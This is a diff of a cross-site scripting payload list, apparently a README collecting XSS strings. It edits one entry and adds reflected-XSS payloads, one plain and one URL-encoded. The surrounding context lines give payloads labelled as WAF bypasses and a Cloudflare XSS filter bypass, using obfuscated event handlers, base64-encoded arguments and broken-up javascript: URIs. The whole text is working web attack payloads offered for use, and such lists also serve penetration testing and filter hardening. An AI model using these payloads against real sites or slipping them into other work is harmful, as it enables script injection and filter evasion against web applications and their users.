@@ -24,7 +24,9 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 <svg%20onx=()%20onload=(confirm)(document.domain)>                                 --> WAF Bypass
 ["');alert('XSS');//"]@xyz.xxx                                                     --> WAF Bypass
 "><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>        --> Cloudflare xss bypass 
-https://xxx.com/path/"><script>alert(1)</script>                                   --> Sometime do add additional parameters like path in this sense and then payload for reflected XSS
+https://xxx.com/path/"><script>alert(1)</script>                                   --> Sometime do add additional parameters like path in this sense and then payload forreflected XSS
+abc`;return false});});alert`xss`;</script>                                        --> For reflected XSS
+abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E              --> For reflected XSS
 <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <d3"<"/onclick="1>[confirm``]"<">z
 <d3/onmouseenter=[2].find(confirm)>z
